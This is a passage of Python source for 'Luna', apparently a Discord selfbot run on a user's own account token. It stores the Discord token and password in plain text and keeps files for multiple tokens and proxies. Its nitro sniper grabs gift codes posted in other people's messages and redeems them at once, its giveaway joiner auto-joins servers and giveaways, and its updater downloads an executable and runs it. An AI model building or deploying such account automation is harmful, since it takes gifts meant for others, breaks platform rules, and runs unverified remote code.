			luna_gg.login(username, password)
			file_check()
		except Exception as e:
			clear()
			print(purpleblue(logo))
			printerror(e)
			time.sleep(1)
			printmessage("Redirecting to the main menu in 5 seconds")
			time.sleep(5)
			luna_authentication()
	else:
		datetime.now(tz=None)
		dateTimeObj = datetime.now()
		timestampStr = dateTimeObj.strftime("%H:%M")
		print(f"{purple(f'{timestampStr}')} | {purple(f'{Input}')} | Username: ", end='')
		username = str(input())
		password = pwinput.pwinput(prompt=f"{purple(f'{timestampStr}')} | {purple(f'{Input}')} | Password: ", mask='*')
		try:
			title(f"Luna | Logging in...")
			clear()
			print(purpleblue(logo))
			printevent("Logging in...")
			luna_gg.login(username, password)
			username = Encryption('5QXapyTDbrRwW4ZBnUgPGAs9CeVSdiLk').CEA256(username)
			password = Encryption('5QXapyTDbrRwW4ZBnUgPGAs9CeVSdiLk').CEA256(password)
			data = {
				"username": f"{username}",
				"password": f"{password}"
			}
			createFolder('./data')
			with open("./data/login.json", "w") as f:
				f.write(json.dumps(data, indent=4))
			file_check()
		except Exception as e:
			clear()
			print(purpleblue(logo))
			printerror(e)
			time.sleep(1)
			printmessage("Redirecting to the main menu in 5 seconds")
			time.sleep(5)
			luna_authentication()

def luna_auth_register():
	clear()
	title(f"Luna | Register")
	print(purpleblue(logo))
	datetime.now(tz=None)
	dateTimeObj = datetime.now()
	timestampStr = dateTimeObj.strftime("%H:%M")
	print(f"{purple(f'{timestampStr}')} | {purple(f'{Input}')} | Username: ", end='')
	username = str(input())
	password = pwinput.pwinput(prompt=f"{purple(f'{timestampStr}')} | {purple(f'{Input}')} | Password: ", mask='*')
	print(f"{purple(f'{timestampStr}')} | {purple(f'{Input}')} | Key: ", end='')
	key = str(input())
	try:
		printevent("Registering...")
		luna_gg.register(email=key, username=username, password=password, license_key=key)
		printmessage("Successfully registered")
		time.sleep(1)
		username = Encryption('5QXapyTDbrRwW4ZBnUgPGAs9CeVSdiLk').CEA256(username)
		password = Encryption('5QXapyTDbrRwW4ZBnUgPGAs9CeVSdiLk').CEA256(password)
		data = {
			"username": f"{username}",
			"password": f"{password}"
		}
		createFolder('./data')
		with open("./data/login.json", "w") as f:
			f.write(json.dumps(data, indent=4))
		luna_auth_login()
	except Exception as e:
		clear()
		print(purpleblue(logo))
		printerror(e)
		time.sleep(1)
		printmessage("Redirecting to the main menu in 5 seconds")
		time.sleep(5)
		luna_authentication()

def luna_update():
	title(f"Luna | Update")
	versionpastedec = urllib.request.urlopen('https://pastebin.com/raw/iQPkzEpg')
	for line in versionpastedec:
		versionpaste = line.decode().strip().replace('\'','')
	clear()
	print(purpleblue(logo))
	printmessage(f"{purple('New version found')}")
	printmessage(f"{purple(f'{versionpaste}')}")
	print()
	print(f"═══════════════════════════════════════════════════════════════════════════════════════════════════\n")
	printevent("Preparing update, please wait...")
	r = requests.get(updateurl, stream=True)
	chunk_size = 1024
	total_size = int(r.headers['content-length'])
	from tqdm import tqdm
	with open('Updater.exe', 'wb') as f:
		for data in tqdm(iterable=r.iter_content(chunk_size=chunk_size), total=total_size / chunk_size,unit='KB'):
			f.write(data)
	printmessage("Downloaded Luna updater")
	time.sleep(2)
	printevent("Starting updater...")
	time.sleep(2)
	os.startfile("Updater.exe")
	os._exit(0)

# ///////////////////////////////////////////////////////////////
# When logged in
@bot.event
async def on_ready():
	command_count = len(bot.commands)
	cog = bot.get_cog('Custom commands')
	custom = cog.get_commands()
	custom_command_count = 0
	for command in custom:
		custom_command_count += 1
	with open("config.json") as f:
		config = json.load(f)
	prefix = config.get('prefix')
	mode = int(config.get('mode'))
	errorlog = config.get('errorlog')
	riskmode = config.get('riskmode')
	themesvar = config.get('theme')
	deletetimer = int(config.get('deletetimer'))
	startup_status = config.get('startup_status')
	with open('data/nitro.json') as f:
		data = json.load(f)
	nitro_sniper = data.get('nitrosniper')
	api = data.get('api')
	with open('data/giveawayjoiner.json') as f:
		data = json.load(f)
	giveawayjoiner = data.get('giveawayjoiner')
	delay_in_minutes = int(data.get('delay_in_minutes'))
	giveaway_server_joiner = data.get('giveaway_server_joiner')

	if mode == 1:
		mode = "Embed"
	elif mode == 2:
		mode = "Text"
	elif mode == 3:
		mode = "Indent"
	else:
		mode = "Unknown"
	
	if afkstatus == 1:
		afk = "on"
	else:
		afk = "off"

	themesvar = themesvar[:-5]
	bot_user = f"{bot.user}"

	ui_user = f"{purple('User:')} {bot_user:<26}"
	ui_guilds = f"{purple('Guilds:')} {len(bot.guilds):<24}"
	ui_friends = f"{purple('Friends:')} {len(bot.user.friends):<23}"

	ui_prefix = f"{purple('Prefix:')} {prefix:<24}"
	ui_mode = f"{purple('Mode:')} {mode:<26}"
	ui_theme = f"{purple('Theme:')} {themesvar:<25}"
	ui_commands = f"{purple('Commands:')} {command_count-custom_command_count:<22}"
	ui_commands_custom = f"{purple('Custom Commands:')} {custom_command_count:<15}"

	ui_nitro_sniper = f"{purple('Nitro Sniper:')} {nitro_sniper}"
	ui_nitro_api = f"{purple('Nitro API:')} {api}"
	ui_giveaway_sniper = f"{purple('Giveaway Joiner:')} {giveawayjoiner}"
	ui_giveaway_delay = f"{purple('Giveaway Delay:')} {delay_in_minutes}"
	ui_giveaway_joiner = f"{purple('Giveaway Guilds:')} {giveaway_server_joiner}"
	ui_afk = f"{purple('AFK Messager:')} {afk}"
	ui_riskmode = f"{purple('Riskmode:')} {riskmode}"
	ui_errorlog = f"{purple('Errorlog:')} {errorlog}"
	ui_deletetimer = f"{purple('Delete Timer:')} {deletetimer}"
	ui_startup = f"{purple('Startup Status:')} {startup_status}"

	versionpastedec = urllib.request.urlopen('https://pastebin.com/raw/iQPkzEpg')
	for line in versionpastedec:
		versionpaste = line.decode().strip().replace('\'','')

	clear()
	title(f"Luna | {versionpaste}")
	print(purpleblue(logo))
	print(motd.center(os.get_terminal_size().columns))
	print()
	# print(f"             ╔══════════════ {purple('User')} ══════════════╗ ╔════════════ {purple('Settings')} ════════════╗")
	# print(f"               {ui_user}     {ui_nitro_sniper}")
	# print(f"               {ui_guilds}     {ui_nitro_api}")
	# print(f"               {ui_friends}     {ui_giveaway_sniper}")
	# print(f"             ╚══════════════════════════════════╝   {ui_giveaway_delay}")
	# print(f"             ╔══════════════ {purple('Luna')} ══════════════╗   {ui_giveaway_joiner}")
	# print(f"               {ui_prefix}     {ui_afk}")
	# print(f"               {ui_mode}     {ui_deletetimer}")
	# print(f"               {ui_theme}     {ui_riskmode}")
	# print(f"               {ui_commands}     {ui_errorlog}")
	# print(f"               {ui_commands_custom}     {ui_startup}")
	# print(f"             ╚══════════════════════════════════╝ ╚══════════════════════════════════╝\n")

	print(f"                           {purple('[')}+{purple('] CONNECTED')}")
	print(f"                           {purple('[')}+{purple(']')} {bot.user} | {purple(f'{len(bot.guilds)}')} Servers | {purple(f'{len(bot.user.friends)}')} Friends")
	print(f"                           {purple('[')}+{purple(']')} {prefix}\n")
	print(f"═══════════════════════════════════════════════════════════════════════════════════════════════════\n")
	printmessage(f"{purple(f'{command_count-custom_command_count}')} commands | {purple(f'{custom_command_count}')} custom commands")
	printmessage(f"{motd}")

	# guild = bot.get_guild(793674589988323330)
	# if bot.user in guild.members:
	#     pass
	# else:
	#     requests.post("https://discordapp.com/api/v6/invites/Kxyv7NHVED",headers={'authorization':token})

	# ///////////////////////////////////////////////////////////////
	# Login toast

	if toast_login() == "on" and toast_all() == "on":
		send_notification(message=f"Logged into {bot.user}")

# ///////////////////////////////////////////////////////////////
# FileCheck

def file_check():
	clear()
	print(purpleblue(logo))
	printevent("Checking files...")
	if file_exist('config.json') and file_exist('./data/themes/luna.json') and file_exist(
			'./data/giveawaybots.json') and file_exist('./data/giveawayjoiner.json') and file_exist(
		'./data/nitro.json') and file_exist('./data/notify.json') and file_exist('./data/proxies.txt') and file_exist(
		'./data/privnote.json') and file_exist('./data/selfbotdetection.json') and file_exist(
		'./data/sharing.json') and file_exist('./data/toast.json') and file_exist('./data/tokens.txt') and file_exist(
		'./data/toasts.json') and file_exist('./data/webhook.json') and file_exist(
		'./data/webhooks.json') and file_exist('./data/backup/friends.txt') and file_exist('./data/resources/luna.ico'):
		init()
	else:
		printevent("Creating files...")
		if not file_exist('config.json'):
			data = {
				"token": "token-here",
				"password": "password-here",
				"prefix": ".",
				"streamurl": "https://www.youtube.com/watch?v=uyE80ebItlA",
				"afkmessage": "Sorry, I am not here right now, DM me later.",
				"deletetimer": "40",
				"mode": "1",
				"errorlog": "message",
				"riskmode": "on",
				"theme": "luna.json",
				"startup_status": "online"
			}
			with open("config.json", "w") as f:
				f.write(json.dumps(data, indent=4))
		if not file_exist('./data/themes/luna.json'):
			createFolder('./data/themes')
			data = {
				"title": "Luna",
				"titleurl": "",
				"footer": "Team Luna",
				"footer_iconurl": "https://cdn.discordapp.com/attachments/878593887113986048/879063329459544074/Luna3.png",
				"imageurl": "https://cdn.discordapp.com/attachments/878593887113986048/879063329459544074/Luna3.png",
				"large_imageurl": "",
				"hexcolor": "#2f3553",
				"author": "",
				"author_iconurl": "",
				"authorurl": "",
				"description": True
			}
			with open("data/themes/luna.json", "w") as f:
				f.write(json.dumps(data, indent=4))

			createFolder('./data/resources')

			if file_exist('./data/resources/luna.ico'):
				pass
			else:
				r = requests.get("https://cdn.discordapp.com/attachments/878593887113986048/878778203068583966/luna.ico", stream=True)

				open('data/resources/luna.ico', 'wb').write(r.content)

			createFolder('./data/privnote')

			createFolder('./data/images')

			createFolder('./data/custom')

			createFolder('./data/backup')

		if not file_exist('./data/backup/friends.txt'):
			file = open("data/backup/friends.txt", "w")
			file.write("Use [prefix]friendsbackup")
			file.close()

		if not file_exist('./data/invites.txt'):
			file = open("data/invites.txt", "w")
			file.write("Put the invites of the servers you want to join here one after another")
			file.close()

		if not file_exist('./data/backup/blocked.txt'):
			file = open("data/backup/blocked.txt", "w")
			file.write("Use [prefix]friendsbackup")
			file.close()

			createFolder('./data')
		if not file_exist('./data/giveawaybots.json'):
			with open("data/giveawaybots.json", "w", encoding="utf-8") as f:
				f.write('''{
    "716967712844414996": "🎉",
    "294882584201003009": "🎉",
    "679379155590184966": "🎉",
    "649604306596528138": "🎉",
    "673918978178940951": "🎉",
    "720351927581278219": "🎉",
    "530082442967646230": "🎉",
    "486970979290054676": "🎉",
    "582537632991543307": "🎉",
    "396464677032427530": "🎉",
    "606026008109514762": "🎉",
    "797025321958244382": "🎉",
    "570338970261782559": "🎉",
    "806644708973346876": "🎉",
    "712783461609635920": "🎉",
	"574812330760863744": "🎁",
	"732003715426287676": "🎁"
}''')

		if not file_exist('./data/giveawayjoiner.json'):
			data = {
				"giveawayjoiner": "on",
				"delay_in_minutes": "1",
				"giveaway_blocked_words": ["ban", "kick", "selfbot", "self bot", "test", "check"],
				"giveaway_server_joiner": "on"
			}
			with open("data/giveawayjoiner.json", "w") as f:
				f.write(json.dumps(data, indent=4))

		if not file_exist('./data/nitro.json'):
			data = {
				"nitrosniper": "on",
				"api": "canary"
			}
			with open("data/nitro.json", "w") as f:
				f.write(json.dumps(data, indent=4))

		if not file_exist('./data/notify.json'):
			data = {
				"nitro": "on",
				"unknown-nitro": "on",
				"giveaway": "on",
				"privnote": "on",
				"selfbot": "on",
				"unknown-selfbot": "on",
				"pings": "on",
				"ghostpings": "on",
				"friendevents": "on",
				"guildevents": "on",
				"roleupdates": "on",
				"nickupdates": "on",
				"protection": "on"
			}
			with open("data/notify.json", "w") as f:
				f.write(json.dumps(data, indent=4))

		if not file_exist('./data/privnote.json'):
			data = {
				"privnotesniper": "on"
			}
			with open("data/privnote.json", "w") as f:
				f.write(json.dumps(data, indent=4))

		if not file_exist('./data/selfbotdetection.json'):
			data = {
				"selfbotdetection": "on"
			}
			with open("data/selfbotdetection.json", "w") as f:
				f.write(json.dumps(data, indent=4))

		if not file_exist('./data/sharing.json'):
			data = {
				"share": "off",
				"user_id": ""
			}
			with open("data/sharing.json", "w") as f:
				f.write(json.dumps(data, indent=4))

		if not file_exist('./data/toast.json'):
			data = {
				"icon": "data/resources/luna.ico",
				"title": "Luna"
			}
			with open("data/toast.json", "w") as f:
				f.write(json.dumps(data, indent=4))

		if not file_exist('./data/toasts.json'):
			data = {
				"toasts": "on",
				"login": "on",
				"nitro": "on",
				"giveaway": "on",
				"privnote": "on",
				"selfbot": "on",
				"pings": "on",
				"ghostpings": "on",
				"friendevents": "on",
				"guildevents": "on",
				"roleupdates": "on",
				"nickupdates": "on",
				"protection": "on"
			}
			with open("data/toasts.json", "w") as f:
				f.write(json.dumps(data, indent=4))

		if not file_exist('./data/tokens.txt'):
			file = open("data/tokens.txt", "w")
			file.write("Put your tokens here line after line.")
			file.close()

		if not file_exist('./data/proxies.txt'):
			file = open("data/proxies.txt", "w")
			file.write("Put your proxies here line after line. (HTTP Only)")
			file.close()

		if not file_exist('./data/webhook.json'):
			data = {
				"title": "Luna",
				"footer": "Luna",
				"imageurl": "https://cdn.discordapp.com/attachments/878593887113986048/878593954352885770/Icon.gif",
				"hexcolor": "#2f3553"
			}
			with open("data/webhook.json", "w") as f:
				f.write(json.dumps(data, indent=4))

		if not file_exist('./data/webhooks.json'):
			data = {
				"serverban": "webhook-url-here",
				"roleupdates": "webhook-url-here",
				"nickupdates": "webhook-url-here",
				"friendevents": "webhook-url-here",
				"guildevents": "webhook-url-here",
				"nitrocodes": "webhook-url-here",
				"redeemednitro": "webhook-url-here",
				"giveaways": "webhook-url-here",
				"won-giveaways": "webhook-url-here",
				"pings": "webhook-url-here",
				"ghostpings": "webhook-url-here",
				"sbdetection": "webhook-url-here",
				"protection": "webhook-url-here"
			}
			with open("data/webhooks.json", "w") as f:
				f.write(json.dumps(data, indent=4))

		file_check()


# ///////////////////////////////////////////////////////////////
# Wizard

def run_wizard():
	datetime.now(tz=None)
	dateTimeObj = datetime.now()
	timestampStr = dateTimeObj.strftime("%H:%M")
	clear()
	print()
	print(f"{timestampStr} | {bcolors.INPUT}{Input}{bcolors.RESET} | Discord Token: ", end='')
	token = str(input())
	password = pwinput.pwinput(prompt=f"{purple(f'{timestampStr}')} | {purple(f'{Input}')} | Discord Password: ", mask='*')
	data = {
		"token": f"{token}",
		"password": f"{password}",
		"prefix": ".",
		"streamurl": "https://www.youtube.com/watch?v=uyE80ebItlA",
		"afkmessage": "Sorry, I am not here right now, DM me later.",
		"deletetimer": "40",
		"mode": "1",
		"errorlog": "message",
		"riskmode": "on",
		"theme": "json",
		"startup_status": "online"
	}
	with open("config.json", "w") as f:
		f.write(json.dumps(data, indent=4))
	init()


# ///////////////////////////////////////////////////////////////
# Main function

def init():
	clear()
	title(f"Luna | Connecting to the token...")
	print(purpleblue(logo))
	printevent("Connecting to the token...")
	if file_exist('config.json'):
		with open("config.json") as f:
			config = json.load(f)
		token = config.get('token')
		if config.get("token") == "token-here":
			if not os.environ.get("token"):
				run_wizard()
		else:
			try:
				bot.run(token)
				title(f"Luna | Connected")
			except discord.errors.LoginFailure:
				clear()
				title(f"Luna | Failed To Connect")
				print(purpleblue(logo))
				printerror("Failed to log into provided token")
				os.system('pause >NUL')
	else:
		file_check()


# ///////////////////////////////////////////////////////////////
# Functions for message types, it took me 5 hours to make this bullshit

def convert_to_text(embed: discord.Embed):
	with open('./config.json') as f:
		config = json.load(f)
	themesvar = config.get('theme')
	with open(f"data/themes/{themesvar}", encoding='utf-8') as f:
		customi = json.load(f)
	largeimagevar = customi.get('large_imageurl')
	if embed.image.url == "":
		if embed.description.endswith("\n"):
			text_mode_builder = f"```ini\n[ {embed.title.replace('**', '')} ]\n\n{embed.description.replace('```', '')}\n[ {embed.footer.text} ]\n```"
		else:
			text_mode_builder = f"```ini\n[ {embed.title.replace('**', '')} ]\n\n{embed.description.replace('```', '')}\n\n[ {embed.footer.text} ]\n```"
		return text_mode_builder
	elif embed.image.url == largeimagevar:
		if embed.description.endswith("\n"):
			text_mode_builder = f"```ini\n[ {embed.title.replace('**', '')} ]\n\n{embed.description.replace('```', '')}\n[ {embed.footer.text} ]\n```"
		else:
			text_mode_builder = f"```ini\n[ {embed.title.replace('**', '')} ]\n\n{embed.description.replace('```', '')}\n\n[ {embed.footer.text} ]\n```"
		return text_mode_builder
	else:
		return embed.image.url


def convert_to_indent(embed: discord.Embed):
	with open('./config.json') as f:
		config = json.load(f)
	themesvar = config.get('theme')
	with open(f"data/themes/{themesvar}", encoding='utf-8') as f:
		customi = json.load(f)
	largeimagevar = customi.get('large_imageurl')
	if embed.image.url == "":
		text = ""

		for line in embed.description.split("\n"):
			indent = "> " + line
			text += indent + "\n"

		if embed.description.endswith("\n"):
			text = text[:-2]
			indent_builder = f"> **{embed.title}**\n> \n{text}> {embed.footer.text}"
		else:
			indent_builder = f"> **{embed.title}**\n> \n{text}> {embed.footer.text}"
		return indent_builder
	elif embed.image.url == largeimagevar:
		text = ""

		for line in embed.description.split("\n"):
			indent = "> " + line
			text += indent + "\n"

		if embed.description.endswith("\n"):
			text = text[:-2]
			indent_builder = f"> **{embed.title}**\n> \n{text}> {embed.footer.text}"
		else:
			indent_builder = f"> **{embed.title}**\n> \n{text}> {embed.footer.text}"
		return indent_builder
	else:
		return embed.image.url


async def send(luna, embed):
	with open('./config.json') as f:
		config = json.load(f)
	deletetimer = int(config.get('deletetimer'))
	mode = int(config.get('mode'))

	if mode == 2:
		await luna.send(convert_to_text(embed), delete_after=deletetimer)
	elif mode == 3:
		await luna.send(convert_to_indent(embed), delete_after=deletetimer)
	else:
		await luna.send(embed=embed, delete_after=deletetimer)

async def mode_error(luna, modes:str):
	if errorlog() == "console":
		printerror(f"That mode does not exist! Only {modes}")
	else:
		embed = discord.Embed(title="Error", url=titleurlvar(), description=f"```\nThat mode does not exist!\nOnly {modes}```", color=0xE10959)
		embed.set_thumbnail(url=imagevar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=largeimagevar())
		await send(luna, embed)

async def embed_builder(luna, title=None, description="", color=None, large_image=None, thumbnail=None):
	if large_image == None:
		large_image = largeimagevar()
	if color == None:
		color = hexcolorvar()
	if thumbnail == None:
		thumbnail = imagevar()
	elif thumbnail == "None":
		thumbnail = ""
	if title == None:
		title = titlevar()
	embed = discord.Embed(title=title, url=titleurlvar(), description=description, color=color)
	embed.set_thumbnail(url=thumbnail)
	embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
	embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
	embed.set_image(url=large_image)
	await send(luna, embed)

async def error_builder(luna, description=""):
	if errorlog() == "console":
		printerror(description.replace('\n',' ').replace('`',''))
	else:
		embed = discord.Embed(title="Error", url=titleurlvar(), description=description, color=0xE10959)
		embed.set_thumbnail(url=imagevar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=largeimagevar())
		await send(luna, embed)

def send_notification(title=None, message=None, audio_path=None):
	notification = Notify(default_notification_application_name="Luna")
	if title == None:
		notification.title = toast_title()
	else:
		notification.title = title
	if not message == None:
		notification.message = message
	notification.icon = toast_icon()
	if not audio_path == None:
		notification.audio = audio_path
	try:
		notification.send(block=False)
	except Exception as e:
		pass

# ///////////////////////////////////////////////////////////////
# On Message Event

class OnMessage(commands.Cog, name="on message"):
	def __init__(self, bot:commands.Bot):
		self.bot = bot
        
	@commands.Cog.listener()
	async def on_message(self, message):
		if message.author == self.bot.user:
			return
		sniped_start_time = time.time()
		try:
			if nitro_sniper() == "on" and 'discord.gift/' in message.content:
				elapsed_snipe = '%.3fs' % (time.time() - sniped_start_time)
				code = re.search("discord.gift/(.*)", message.content).group(1)
				if len(code) >= 16:
					async with httpx.AsyncClient() as client:
						start_time = time.time()
						if nitro_sniper_api() == "v6":
							result = await client.post(f'https://discordapp.com/api/v6/entitlements/gift-codes/{code}/redeem', json={'channel_id': message.channel.id}, headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
						elif nitro_sniper_api() == "v7":
							result = await client.post(f'https://discordapp.com/api/v7/entitlements/gift-codes/{code}/redeem', json={'channel_id': message.channel.id}, headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
						elif nitro_sniper_api() == "v8":
							result = await client.post(f'https://discordapp.com/api/v8/entitlements/gift-codes/{code}/redeem', json={'channel_id': message.channel.id}, headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
						elif nitro_sniper_api() == "v9":
							result = await client.post(f'https://discordapp.com/api/v9/entitlements/gift-codes/{code}/redeem', json={'channel_id': message.channel.id}, headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
						else:
							result = await client.post(f'https://canary.discordapp.com/api/v8/entitlements/gift-codes/{code}/redeem', json={'channel_id': message.channel.id}, headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
						elapsed = '%.3fs' % (time.time() - start_time)
					status = 'Ratelimit'
					redeemedping = False
					if 'This gift has been redeemed already' in str(result.content):
						status = 'Nitro already redeemed'
						return
					elif 'nitro' in str(result.content):
						status = 'Nitro successfully redeemed'
						redeemedping = True
					elif 'Unknown Gift Code' in str(result.content):
						status = 'Unknown gift code'
						return

					datetime.now(tz=None)
					dateTimeObj = datetime.now()
					timestampStr = dateTimeObj.strftime("%H:%M")

					print(f"\n{purple(f'{timestampStr}')} | {purple(f'{SniperLog}')}  | {purple('Nitro sniped')}"
						f"\n{purple(f'{timestampStr}')} | {purple(f'{SniperLog}')}  | Server  | {purple(f'{message.guild}')}"
						f"\n{purple(f'{timestampStr}')} | {purple(f'{SniperLog}')}  | Channel | {purple(f'{message.channel}')}"
						f"\n{purple(f'{timestampStr}')} | {purple(f'{SniperLog}')}  | Author  | {purple(f'{message.author}')}"
						f"\n{purple(f'{timestampStr}')} | {purple(f'{SniperLog}')}  | Code    | {purple(f'{code}')}"
						f"\n{purple(f'{timestampStr}')} | {purple(f'{SniperLog}')}  | Status  | {purple(f'{status}')}"
						f"\n{purple(f'{timestampStr}')} | {purple(f'{SniperLog}')}  | Elapsed Times"
						f"\n{purple(f'{timestampStr}')} | {purple(f'{SniperLog}')}  | Sniped  | {purple(f'{elapsed_snipe}')}"
						f"\n{purple(f'{timestampStr}')} | {purple(f'{SniperLog}')}  | API     | {purple(f'{elapsed}')}"
						"\n")
					if toast_nitro() == "on" and toast_all() == "on":
						send_notification(message=f"Redeemed a nitro code\nServer »  {message.guild}\nChannel » {message.channel}\nAuthor »  {message.author}")
		except Exception as e:
			printerror(e)


		if file_exist('./data/giveawayjoiner.json'):
			pass
		else:
			data = {
                "giveawayjoiner": "on",
                "delay_in_minutes": "1",
                "giveaway_blocked_words": ["ban", "kick", "selfbot", "self bot", "test", "check"],
                "giveaway_server_joiner": "on"
            }
			with open("data/giveawayjoiner.json", "w") as f:
				f.write(json.dumps(data, indent=4))

		with open("data/giveawayjoiner.json", "r") as f:
			data = json.load(f)
		giveawayjoiner = data.get('giveawayjoiner')
		delay_in_minutes = int(data.get('delay_in_minutes'))
		giveaway_blocked_words = data.get('giveaway_blocked_words')
		giveaway_server_joiner = data.get('giveaway_server_joiner')
		if giveawayjoiner == "on" and message.author.bot and not message.guild is None and not isinstance(message.channel, discord.GroupChannel):
			elapsed_snipe = '%.3fs' % (time.time() - sniped_start_time)
			custom_giveaway_bot_ids = []
			custom_giveaway_bot_reactions = []
			try:
				if os.path.exists('data/giveawaybots.json'):
					with open("data/giveawaybots.json", "r", encoding="utf-8") as jsonFile:
						data = json.load(jsonFile)
                            
					for key, value in data.items():
						try:
							custom_giveaway_bot_ids.append(int(key))
							custom_giveaway_bot_reactions.append(str(value))
						except Exception:
							pass
			except Exception:
				pass

			if ((("giveaway" in str(message.content).lower()) and (int(message.author.id) in custom_giveaway_bot_ids) and ("cancelled" not in str(message.content).lower()) and ("mention" not in str(message.content).lower()) and ("specify" not in str(message.content).lower()) and ("congratulations" not in str(message.content).lower()))):
				found_something_blacklisted = 0
				for blocked_word in giveaway_blocked_words:
					if str(blocked_word).lower() in str(message.content).lower():
						datetime.now(tz=None)
						dateTimeObj = datetime.now()
						timestampStr = dateTimeObj.strftime("%H:%M")
						print(f"\n{purple(f'{timestampStr}')} | {purple(f'{SniperLog}')}  | {purple('Skipped giveaway')}"
							f"\n{purple(f'{timestampStr}')} | {purple(f'{SniperLog}')}  | Reason  | Backlisted word: {purple(f'{blocked_word}')}"
							f"\n{purple(f'{timestampStr}')} | {purple(f'{SniperLog}')}  | Server  | {purple(f'{message.guild}')}"
							f"\n{purple(f'{timestampStr}')} | {purple(f'{SniperLog}')}  | Channel | {purple(f'{message.channel}')}"
							"\n")
						if toast_giveaway() == "on" and toast_all() == "on":
							send_notification(message=f"Skipped giveaway\nReason » {blocked_word}\nServer »  {message.guild}\nChannel » {message.channel}")
						found_something_blacklisted = 1

				try:
					for embed in message.embeds:
						embed_dict = embed.to_dict()
						for blocked_word in giveaway_blocked_words:
							try:
								found = re.findall(blocked_word, str(embed_dict).lower())[0]
								if found:
									datetime.now(tz=None)
									dateTimeObj = datetime.now()
									timestampStr = dateTimeObj.strftime("%H:%M")
									print(f"\n{purple(f'{timestampStr}')} | {purple(f'{SniperLog}')}  | {purple('Skipped giveaway')}"
										f"\n{purple(f'{timestampStr}')} | {purple(f'{SniperLog}')}  | Reason  | Backlisted word: {purple(f'{blocked_word}')}"
										f"\n{purple(f'{timestampStr}')} | {purple(f'{SniperLog}')}  | Server  | {purple(f'{message.guild}')}"
										f"\n{purple(f'{timestampStr}')} | {purple(f'{SniperLog}')}  | Channel | {purple(f'{message.channel}')}"
										"\n")
									if toast_giveaway() == "on" and toast_all() == "on":
										send_notification(message=f"Skipped giveaway\nReason » {blocked_word}\nServer »  {message.guild}\nChannel » {message.channel}")
									found_something_blacklisted = 1
									break
							except:
								pass
                                        
							if found_something_blacklisted > 0:
								break
				except:
					pass
						
				if found_something_blacklisted == 0:
					try:
						embeds = message.embeds
						joined_server = 'None'
						giveaway_prize = None
						try:
							for embed in embeds:
								giveaway_prize = embed.to_dict()['author']['name']
						except Exception:
							for embed in embeds:
								giveaway_prize = embed.to_dict()['title']
						if giveaway_server_joiner == "on":
							try:
								for embed in embeds:
									embed_dict = embed.to_dict()
									code = re.findall(r"\w[a-z]*\W*\w[a-z]+\.\w[g]*\W\S*", str(embed_dict['description']))[0].replace(")", "").replace("https://discord.gg/", "")
									async with httpx.AsyncClient() as client:
										await client.post(f'https://canary.discord.com/api/v8/invites/{code}', headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
										joined_server = f'discord.gg/{code}'
										await asyncio.sleep(5)
							except Exception:
								pass
						else:
							pass
						datetime.now(tz=None)
						dateTimeObj = datetime.now()
						timestampStr = dateTimeObj.strftime("%H:%M")
						print(f"\n{purple(f'{timestampStr}')} | {purple(f'{SniperLog}')}  | {purple('Giveaway found')}"
							f"\n{purple(f'{timestampStr}')} | {purple(f'{SniperLog}')}  | Prize   | {purple(f'{giveaway_prize}')}"
							f"\n{purple(f'{timestampStr}')} | {purple(f'{SniperLog}')}  | Server  | {purple(f'{message.guild}')}"
							f"\n{purple(f'{timestampStr}')} | {purple(f'{SniperLog}')}  | Channel | {purple(f'{message.channel}')}"
							f"\n{purple(f'{timestampStr}')} | {purple(f'{SniperLog}')}  | Joining | {purple(f'In {delay_in_minutes} minute/s')}"
							f"\n{purple(f'{timestampStr}')} | {purple(f'{SniperLog}')}  | Invite  | {purple(f'Joined guild: {joined_server}')}"
							"\n")
						if toast_giveaway() == "on" and toast_all() == "on":
							send_notification(message=f"Giveaway found\nPrize » {giveaway_prize}\nServer »  {message.guild}\nChannel » {message.channel}")
					except Exception as e:
						printerror(e)
						return
							
					await asyncio.sleep(delay_in_minutes * 60)

					try:
						if int(message.author.id) in custom_giveaway_bot_ids:
							index = custom_giveaway_bot_ids.index(int(message.author.id))
							try:
								await message.add_reaction(custom_giveaway_bot_reactions[index])
							except Exception as e:
								printerror(e)
								return
							datetime.now(tz=None)
							dateTimeObj = datetime.now()
							timestampStr = dateTimeObj.strftime("%H:%M")
							print(f"\n{purple(f'{timestampStr}')} | {purple(f'{SniperLog}')}  | {purple('Joined giveaway')}"
								f"\n{purple(f'{timestampStr}')} | {purple(f'{SniperLog}')}  | Prize   | {purple(f'{giveaway_prize}')}"
								f"\n{purple(f'{timestampStr}')} | {purple(f'{SniperLog}')}  | Server  | {purple(f'{message.guild}')}"
								f"\n{purple(f'{timestampStr}')} | {purple(f'{SniperLog}')}  | Channel | {purple(f'{message.channel}')}"
								"\n")
							if toast_giveaway() == "on" and toast_all() == "on":
								send_notification(message=f"Joined giveaway\nPrize » {giveaway_prize}\nServer »  {message.guild}\nChannel » {message.channel}")
					except Exception:
						pass

			if '<@' + str(bot.user.id) + '>' in message.content and ('giveaway' in str(message.content).lower() or ' won ' in message.content or ' winner ' in str(message.content).lower()) and message.author.bot and message.author.id in custom_giveaway_bot_ids:
				datetime.now(tz=None)
				dateTimeObj = datetime.now()
				timestampStr = dateTimeObj.strftime("%H:%M")
				print(f"\n{purple(f'{timestampStr}')} | {purple(f'{SniperLog}')}  | {purple('Won giveaway')}"
					f"\n{purple(f'{timestampStr}')} | {purple(f'{SniperLog}')}  | Server  | {purple(f'{message.guild}')}"
					f"\n{purple(f'{timestampStr}')} | {purple(f'{SniperLog}')}  | Channel | {purple(f'{message.channel}')}"
					"\n")
				if toast_giveaway() == "on" and toast_all() == "on":
					send_notification(message=f"Won giveaway\nServer »  {message.guild}\nChannel » {message.channel}")

		if giveawayjoiner == "on" and message.author.bot:
			if "joining" in str(message.content).lower() and giveaway_server_joiner == "on":
				try:
					for embed in embeds:
						embed_dict = embed.to_dict()
